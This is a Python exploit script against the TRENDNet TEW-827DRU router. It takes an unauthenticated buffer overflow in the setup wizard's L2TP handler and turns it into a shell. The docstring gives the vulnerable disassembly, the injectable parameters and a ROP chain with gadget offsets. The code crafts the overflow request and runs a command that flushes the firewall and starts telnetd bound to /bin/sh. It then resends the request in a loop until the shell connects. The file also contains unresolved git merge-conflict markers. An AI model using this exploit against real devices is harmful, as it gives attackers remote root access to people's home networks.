"""
This script exercises an unauthenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect
to a reverse shell.

The router allows unauthenticated access to the setup wizard functionality. Within the setup wizard there is a buffer
overflow processing all user defined values to the do_wizard_wan_l2tp_cgi function. The vulnerable disassembly for the
first user processed values is shown below.

LOAD:0043DAB0                 addiu   $s0, $v0, (aUciSetNetworkW_0 - 0x4D0000)  # "uci set network.wan.hostname=%s"
LOAD:0043DAB4                 la      $v0, aTDelay     # "t_delay"
LOAD:0043DAB8                 nop
LOAD:0043DABC                 addiu   $a0, $v0, (aSystemSystem0H_0 - 0x4C0000)  # "system.@system[0].hostname"
LOAD:0043DAC0                 la      $v0, safe_getenv
LOAD:0043DAC4                 nop
LOAD:0043DAC8                 move    $t9, $v0
LOAD:0043DACC                 bal     safe_getenv
LOAD:0043DAD0                 nop
LOAD:0043DAD4                 lw      $gp, 0x138+saved_gp($fp)
LOAD:0043DAD8                 addiu   $v1, $fp, 0x138+var_114
LOAD:0043DADC                 move    $a0, $v1         # s
LOAD:0043DAE0                 move    $a1, $s0         # format
LOAD:0043DAE4                 move    $a2, $v0
LOAD:0043DAE8                 la      $v0, sprintf
LOAD:0043DAEC                 nop
LOAD:0043DAF0                 move    $t9, $v0
LOAD:0043DAF4                 jalr    $t9 ; sprintf
LOAD:0043DAF8                 nop

system.@system[0].hostname can be replace with other user defined values requiring minimal changes to the exploit. The
other valid values are:
    - cameo.wan.wan_l2tp_server_ip
    - cameo.wan.wan_l2tp_username
    - cameo.wan.wan_l2tp_password
    - cameo.wan.wan_l2tp_ipaddr (requires cameo.wan.wan_l2tp_dynamic != 1)
    - cameo.wan.wan_l2tp_netmask (requires cameo.wan.wan_l2tp_dynamic != 1)
    - cameo.wan.wan_l2tp_gateway (requires cameo.wan.wan_l2tp_dynamic != 1)

The cgi file that contains the exploit was compiled with library randomization enabled meaning the exploit must be
repeatedly thrown until libuClibc gets loaded at the address used as the base in the exploit. Sometimes this is quick,
sometimes it takes a few minutes.

The ROP chain used in the exploit is shown below.
 - rop1 - This router has rather odd behavior, instead of using temporary 's' registers within the function it uses $v0
          and $v1 to move arguments around. Because of this the functions only save $fp and $ra which is kinda hard to
          make useful chains with one registers. The first rop gadget gives us control of $s0 - $s6 to give us a larger
          variety of ROPs available.
 - rop2 - The address of system ends in 0x20, ASCII for space, which we can't directly send in the URL. So, we replace
          the 0x20 with 0x1C and use this gadget to increment the address of system to the proper address.
 - rop3 - Grab a string off the stack and call system with it.

---------------------------------------------------------------
| Gadget Name | Gadget Offset | Gadget Summary                |
---------------------------------------------------------------
| rop1        | 0x0003E164    | lw      $ra, 0x40+var_4($sp)  |
|             |               | lw      $s6, 0x40+var_8($sp)  |
|             |               | lw      $s5, 0x40+var_C($sp)  |
|             |               | lw      $s4, 0x40+var_10($sp) |
|             |               | lw      $s3, 0x40+var_14($sp) |
|             |               | lw      $s2, 0x40+var_18($sp) |
|             |               | lw      $s1, 0x40+var_1C($sp) |
|             |               | lw      $s0, 0x40+var_20($sp) |
|             |               | jr      $ra                   |
|             |               | addiu   $sp, 0x40             |
---------------------------------------------------------------
| rop2        | 0x00053168    | addiu   $s3, 4                |
|             |               | move    $t9, $s5              |
|             |               | jalr    $t9                   |
|             |               | lw      $a0, 0($s3)           |
---------------------------------------------------------------
| rop3        | 0x0003CA64    | addiu   $a0, $sp, 0x70+var_48 |
|             |               | li      $a1, 1                |
|             |               | move    $t9, $s3              |
|             |               | jalr    $t9                   |
|             |               | move    $a2, $s5              |
---------------------------------------------------------------

The overflow is generated using the Mips Overflow Writer from https://github.com/fuzzywalls/mow
"""
<<<<<<< HEAD
import os
import mow
import signal
=======
import mow
import time
>>>>>>> 2c282b40d2ff01ce9d5b9758193133fb61a9820a
import argparse
import telnetlib


<<<<<<< HEAD
def ctrl_c_handler(_, __):
    """
    Handle ctrl-c so the program can exit.
    """
    os.kill(os.getpid(), 9)


=======
>>>>>>> 2c282b40d2ff01ce9d5b9758193133fb61a9820a
def telnet_connect(host, port):
    """
    Connect to a listening telnet server.

    :param host: Telnet server IP address.
    :type host: str

    :param port: Telnet server listening port.
    :type port: int

    :return: Telnet session or None
    """
    try:
        return telnetlib.Telnet(host, port, 0.1)
    except:
        return None


def generate_exploit_packet(host, port, command):
    """
    Generate packet to exploit the target.

    :param host: IP address of the target.
    :type host: str

    :param port: Listening port of the target.
    :type port: int

    :param command: Command to execute upon successful exploitation.
    :type command: str

    :return: Packet to send to the target.
    :rtype: bytes
    """
    rop1 = 0x3e164
    rop2 = 0x53168
    rop3 = 0x3ca64

    system = 0x57b1c

    overflow = mow.Overflow(0x114, 2, mow.LITTLE_ENDIAN, 0, 0x76fd5000, 'uci set network.wan.hostname=')
    overflow.ra = rop1
    overflow.add_to_stack(0x3c, address=rop2)
    overflow.add_to_stack(0x34, address=rop3)
    overflow.add_to_stack(0x2c, address=system)
    overflow.add_to_stack(0x68, command=command.replace(' ', '${IFS}'))
    overflow_string = overflow.generate()

    data = {b'ccp_act': b'set',
            b'action': b'wizard_wan',
            b'cameo.wan.wan_proto': b'l2tp',
            b'cameo.wan.wan_l2tp_dynamic': b'1',
            b'system.@system[0].hostname': overflow_string}

    data = b'&'.join(b'%s=%s' % (key, value) for key, value in data.items())
    request = mow.CustomRequest(host, port, mow.POST, b'apply_sec.cgi', data=data)
    packet = request.create_packet()
    return packet


def exploit_target(host, port, telnet_port):
    """
    Repeatedly attempt to exploit the target until a reverse shell is established.

    :param host: IP address of the target.
    :type host: str

    :param port: Listening port of the target.
    :type port: int

    :param telnet_port: Port to open to establish the telnet connection.
    :type telnet_port: int
    """
    telnet_command = 'iptables -F|telnetd -l /bin/sh -p %d' % telnet_port
    packet = generate_exploit_packet(host, port, telnet_command)

    print('Repeatedly throwing exploit...this may take some time. Shell will appear when it succeeds.')

    tn = telnet_connect(host, telnet_port)
    while tn is None:
        try:
            mow.send_packet(host, port, packet)
        except:
            continue
        tn = telnet_connect(host, telnet_port)
<<<<<<< HEAD
=======
        time.sleep(.1)
>>>>>>> 2c282b40d2ff01ce9d5b9758193133fb61a9820a

    tn.interact()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Unauthenticated buffer overflow processing setup wizard parameters in'
                                                 ' the TRENDNet TEW-827DRU.')

    parser.add_argument('-i', '--ip', help='Target IP address', required=True)
    parser.add_argument('-p', '--port', help='Target port.', type=int, default=80)
    parser.add_argument('-t', '--tport', help='Telnet port to connect to on successful exploitation.', type=int,
                        default=5555)

    args = parser.parse_args()

<<<<<<< HEAD
    signal.signal(signal.SIGINT, ctrl_c_handler)

=======
>>>>>>> 2c282b40d2ff01ce9d5b9758193133fb61a9820a
    exploit_target(args.ip, args.port, args.tport)
